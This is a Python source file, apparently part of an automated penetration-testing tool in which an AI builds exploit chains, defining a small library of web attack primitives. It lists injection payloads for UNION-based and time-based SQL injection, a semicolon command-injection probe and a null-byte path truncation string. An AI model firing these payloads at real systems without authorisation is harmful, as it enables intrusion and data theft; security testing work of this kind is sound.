# chimera/knowledge/vulnerabilities/primitives.py

from typing import Dict, List
from pydantic import BaseModel

class ExploitPrimitive(BaseModel):
    name: str
    required_conditions: List[str]
    trigger_payload: str
    observable_effect: str
    confidence_boost: float  # How much this primitive increases hypothesis confidence
    
class ExploitPrimitiveLibrary:
    """
    The AI uses these as building blocks for exploit chains.
    Like LEGO bricks for the Causal Engine.
    """
    
    PRIMITIVES: Dict[str, ExploitPrimitive] = {
        "sql_union_extract": ExploitPrimitive(
            name="UNION-based data extraction",
            required_conditions=[
                "Stacked queries enabled OR UNION allowed",
                "Output reflected in response",
                "Column count determinable"
            ],
            trigger_payload="' UNION SELECT NULL,NULL,NULL--",
            observable_effect="Response contains extra rows or changed structure",
            confidence_boost=0.3
        ),
        "sql_time_delay": ExploitPrimitive(
            name="Time-based blind SQLi",
            required_conditions=[
                "SLEEP() or pg_sleep() or benchmark() available",
                "Response timing measurable",
                "No WAF rate limiting on slow queries"
            ],
            trigger_payload="' OR SLEEP(5)--",
            observable_effect="Response delay of ~5 seconds",
            confidence_boost=0.25
        ),
        "cmd_semicolon_chain": ExploitPrimitive(
            name="Command chaining via semicolon",
            required_conditions=[
                "Input reaches shell execution",
                "Semicolon is not escaped by sanitizer",
                "Shell is /bin/sh or bash"
            ],
            trigger_payload="; whoami",
            observable_effect="Response contains 'root' or 'www-data'",
            confidence_boost=0.4
        ),
        "path_null_byte": ExploitPrimitive(
            name="Null byte path truncation",
            required_conditions=[
                "PHP version < 5.3.4 OR C string handling",
                "Path construction uses user input",
                "Null byte not stripped before file operation"
            ],
            trigger_payload="file.txt%00.php",
            observable_effect="Server reads file.txt instead of file.txt.php",
            confidence_boost=0.35
        )
    }
    
    @classmethod
    def find_for_differential(cls, boundary: str, dangerous_chars: set) -> List[ExploitPrimitive]:
        """Find primitives that match a grammar differential."""
        matches = []
        for prim in cls.PRIMITIVES.values():
            # Check if any trigger payload char matches the dangerous chars
            if any(c in prim.trigger_payload for c in dangerous_chars):
                matches.append(prim)
        return matches